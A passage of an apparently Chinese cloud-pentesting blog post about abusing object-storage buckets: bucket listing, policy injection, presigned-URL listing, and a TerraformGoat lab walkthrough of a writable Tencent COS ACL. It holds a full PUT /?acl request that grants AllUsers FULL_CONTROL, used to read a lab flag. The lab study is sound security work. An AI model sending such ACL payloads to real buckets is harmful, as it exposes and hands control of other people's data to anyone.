+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">lsec</span><span class="p">.</span><span class="na">oss</span><span class="o">-</span><span class="n">cn</span><span class="o">-</span><span class="n">wuhan</span><span class="o">-</span><span class="n">lr</span><span class="p">.</span><span class="na">aliyuncs</span><span class="p">.</span><span class="na">com</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="n">135</span><span class="p">.</span><span class="na">0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="n">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="n">135</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Dest</span><span class="p">:</span><span class="w"> </span><span class="n">document</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Mode</span><span class="p">:</span><span class="w"> </span><span class="n">navigate</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="n">none</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">User</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Priority</span><span class="p">:</span><span class="w"> </span><span class="n">u</span><span class="o">=</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Te</span><span class="p">:</span><span class="w"> </span><span class="n">trailers</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">123111134</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="15存储桶列桶">1.5.存储桶列桶
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">https</span><span class="p">:</span><span class="c1">//xxx-cos-xxxx.cos.ap-guangzhou.myqcloud.com/?uploads      列出所有存储桶</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="151配置问题导致访问直接列桶">1.5.1.配置问题导致访问直接列桶
+</h4><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/32.png"
+	width="1386"
+	height="601"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/32_hu_fa00cdcd783c21f0.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/32_hu_81935702fd05efde.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="230"
+		data-flex-basis="553px"
+	
+></p>
+<h4 id="152policy注入导致列桶">1.5.2.Policy注入导致列桶
+</h4><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/33.png"
+	width="1787"
+	height="853"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/33_hu_8ec32b62c1f894f2.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/33_hu_96ea2d61757805c3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="209"
+		data-flex-basis="502px"
+	
+></p>
+<h4 id="153预签名列桶">1.5.3.预签名列桶
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /api/xxx/xxx/cos
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{url:http://xxxxx-aliyuncs.com/}         //将url改成存储桶根目录进行预签名
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="16腾讯云-cos-bucket-acl-可写漏洞">1.6.<font style="color:rgb(31, 35, 40);">腾讯云 COS Bucket ACL 可写漏洞</font>
+</h3><p><a class="link" href="https://github.com/HXSecurity/TerraformGoat/blob/main/tencentcloud/cos/bucket_acl_writable/README_CN.md"  target="_blank" rel="noopener"
+    >https://github.com/HXSecurity/TerraformGoat/blob/main/tencentcloud/cos/bucket_acl_writable/README_CN.md</a></p>
+<p>1.<font style="color:rgb(31, 35, 40);">尝试遍历 Object，发现访问被拒绝</font></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/13.png"
+	width="1477"
+	height="569"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/13_hu_fd99cf8661e0c647.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/13_hu_87a847f66ab88f07.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="259"
+		data-flex-basis="622px"
+	
+></p>
+<p>2.<font style="color:rgb(31, 35, 40);">尝试读取 Bucket 的 ACL 策略，发现可以读取</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">https</span><span class="p">:</span><span class="c1">//houxian-7hg0v-1316547049.cos.ap-beijing.myqcloud.com/?acl</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/14.png"
+	width="1545"
+	height="1042"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/14_hu_b7b75c1c17c08d01.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/14_hu_eeb4ad8e7c2ac2d9.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="148"
+		data-flex-basis="355px"
+	
+></p>
+<p>3.<font style="color:rgb(31, 35, 40);">尝试使用 PUT 方法修改 Bucket 的 ACL 策略</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">Grant</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">&lt;</span><span class="n">Grantee</span><span class="w"> </span><span class="n">xmlns</span><span class="p">:</span><span class="n">xsi</span><span class="o">=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span><span class="w"> </span><span class="n">xsi</span><span class="p">:</span><span class="n">type</span><span class="o">=</span><span class="s">&#34;Group&#34;</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;</span><span class="n">URI</span><span class="o">&gt;</span><span class="n">http</span><span class="p">:</span><span class="c1">//cam.qcloud.com/groups/global/AllUsers&lt;/URI&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">&lt;/</span><span class="n">Grantee</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">&lt;</span><span class="n">Permission</span><span class="o">&gt;</span><span class="n">FULL_CONTROL</span><span class="o">&lt;/</span><span class="n">Permission</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">Grant</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">PUT</span><span class="w"> </span><span class="o">/?</span><span class="n">acl</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">houxian</span><span class="o">-</span><span class="n">7hg0v</span><span class="o">-</span><span class="n">1316547049</span><span class="p">.</span><span class="na">cos</span><span class="p">.</span><span class="na">ap</span><span class="o">-</span><span class="n">beijing</span><span class="p">.</span><span class="na">myqcloud</span><span class="p">.</span><span class="na">com</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="n">136</span><span class="p">.</span><span class="na">0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="n">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="n">136</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Dest</span><span class="p">:</span><span class="w"> </span><span class="n">document</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Mode</span><span class="p">:</span><span class="w"> </span><span class="n">navigate</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="n">none</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">User</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Priority</span><span class="p">:</span><span class="w"> </span><span class="n">u</span><span class="o">=</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Te</span><span class="p">:</span><span class="w"> </span><span class="n">trailers</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">1224</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">AccessControlPolicy</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="o">&lt;</span><span class="n">Owner</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="o">&lt;</span><span class="n">ID</span><span class="o">&gt;</span><span class="n">qcs</span><span class="p">::</span><span class="n">cam</span><span class="p">::</span><span class="n">uin</span><span class="o">/</span><span class="n">100029253378</span><span class="p">:</span><span class="n">uin</span><span class="o">/</span><span class="n">100029253378</span><span class="o">&lt;/</span><span class="n">ID</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="o">&lt;</span><span class="n">DisplayName</span><span class="o">&gt;</span><span class="n">qcs</span><span class="p">::</span><span class="n">cam</span><span class="p">::</span><span class="n">uin</span><span class="o">/</span><span class="n">100029253378</span><span class="p">:</span><span class="n">uin</span><span class="o">/</span><span class="n">100029253378</span><span class="o">&lt;/</span><span class="n">DisplayName</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="o">&lt;/</span><span class="n">Owner</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="o">&lt;</span><span class="n">AccessControlList</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="o">&lt;</span><span class="n">Grant</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="o">&lt;</span><span class="n">Grantee</span><span class="w"> </span><span class="n">xmlns</span><span class="p">:</span><span class="n">xsi</span><span class="o">=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span><span class="w"> </span><span class="n">xsi</span><span class="p">:</span><span class="n">type</span><span class="o">=</span><span class="s">&#34;CanonicalUser&#34;</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="o">&lt;</span><span class="n">ID</span><span class="o">&gt;</span><span class="n">qcs</span><span class="p">::</span><span class="n">cam</span><span class="p">::</span><span class="n">uin</span><span class="o">/</span><span class="n">100029253378</span><span class="p">:</span><span class="n">uin</span><span class="o">/</span><span class="n">100029253378</span><span class="o">&lt;/</span><span class="n">ID</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="o">&lt;</span><span class="n">DisplayName</span><span class="o">&gt;</span><span class="n">qcs</span><span class="p">::</span><span class="n">cam</span><span class="p">::</span><span class="n">uin</span><span class="o">/</span><span class="n">100029253378</span><span class="p">:</span><span class="n">uin</span><span class="o">/</span><span class="n">100029253378</span><span class="o">&lt;/</span><span class="n">DisplayName</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="o">&lt;/</span><span class="n">Grantee</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="o">&lt;</span><span class="n">Permission</span><span class="o">&gt;</span><span class="n">FULL_CONTROL</span><span class="o">&lt;/</span><span class="n">Permission</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="o">&lt;/</span><span class="n">Grant</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="o">&lt;</span><span class="n">Grant</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="o">&lt;</span><span class="n">Grantee</span><span class="w"> </span><span class="n">xmlns</span><span class="p">:</span><span class="n">xsi</span><span class="o">=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span><span class="w"> </span><span class="n">xsi</span><span class="p">:</span><span class="n">type</span><span class="o">=</span><span class="s">&#34;Group&#34;</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="o">&lt;</span><span class="n">URI</span><span class="o">&gt;</span><span class="n">http</span><span class="p">:</span><span class="c1">//cam.qcloud.com/groups/global/AllUsers&lt;/URI&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="o">&lt;/</span><span class="n">Grantee</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="o">&lt;</span><span class="n">Permission</span><span class="o">&gt;</span><span class="n">WRITE_ACP</span><span class="o">&lt;/</span><span class="n">Permission</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="o">&lt;/</span><span class="n">Grant</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="o">&lt;</span><span class="n">Grant</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="o">&lt;</span><span class="n">Grantee</span><span class="w"> </span><span class="n">xmlns</span><span class="p">:</span><span class="n">xsi</span><span class="o">=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span><span class="w"> </span><span class="n">xsi</span><span class="p">:</span><span class="n">type</span><span class="o">=</span><span class="s">&#34;Group&#34;</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="o">&lt;</span><span class="n">URI</span><span class="o">&gt;</span><span class="n">http</span><span class="p">:</span><span class="c1">//cam.qcloud.com/groups/global/AllUsers&lt;/URI&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="o">&lt;/</span><span class="n">Grantee</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="o">&lt;</span><span class="n">Permission</span><span class="o">&gt;</span><span class="n">READ_ACP</span><span class="o">&lt;/</span><span class="n">Permission</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="o">&lt;/</span><span class="n">Grant</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="o">&lt;</span><span class="n">Grant</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		  </span><span class="o">&lt;</span><span class="n">Grantee</span><span class="w"> </span><span class="n">xmlns</span><span class="p">:</span><span class="n">xsi</span><span class="o">=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span><span class="w"> </span><span class="n">xsi</span><span class="p">:</span><span class="n">type</span><span class="o">=</span><span class="s">&#34;Group&#34;</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		    </span><span class="o">&lt;</span><span class="n">URI</span><span class="o">&gt;</span><span class="n">http</span><span class="p">:</span><span class="c1">//cam.qcloud.com/groups/global/AllUsers&lt;/URI&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		  </span><span class="o">&lt;/</span><span class="n">Grantee</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		  </span><span class="o">&lt;</span><span class="n">Permission</span><span class="o">&gt;</span><span class="n">FULL_CONTROL</span><span class="o">&lt;/</span><span class="n">Permission</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="o">&lt;/</span><span class="n">Grant</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="o">&lt;/</span><span class="n">AccessControlList</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">AccessControlPolicy</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/15.png"
+	width="2507"
+	height="947"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/15_hu_5e29824291453b0e.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/15_hu_2224571194705b55.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="264"
+		data-flex-basis="635px"
+	
+></p>
+<p><strong><font style="color:rgb(31, 35, 40);">4.再次尝试遍历 Object，发现已经可以遍历到了，说明刚才上传的 ACL 策略生效了，在返回的信息中可以看到 flag</font></strong></p>
+<p><img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/16.png"
+	width="1346"
+	height="594"
+	srcset="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/16_hu_afea1d1285e61c99.png 480w, /p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image/16_hu_970ce8122290fb4e.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="226"
+		data-flex-basis="543px"
+	
+></p>
+<h2 id="2terraformgoat云场景漏洞靶场搭建">2.TerraformGoat<font style="color:rgba(0, 0, 0, 0.9);">云场景漏洞</font>靶场搭建
+</h2><p><a class="link" href="https://mp.weixin.qq.com/s/o5lTBtnXRrlKjh3FY6h9lA"  target="_blank" rel="noopener"
+    >云场景漏洞靶场：TerraformGoat，支持6家云厂商</a></p>
+<p><strong>TerraformGoat 是一个支持多云的云场景漏洞靶场搭建工具，目前支持阿里云、腾讯云、华为云、Amazon Web Services、Google Cloud Platform、Microsoft Azure 六个云厂商的云场景漏洞搭建。</strong></p>
+<h3 id="21安装docker">2.1.安装docker
+</h3><p><a class="link" href="https://blog.csdn.net/SUBSEA123/article/details/123211835"  target="_blank" rel="noopener"
+    >一篇文章完成Centos7安装docker-CSDN博客</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
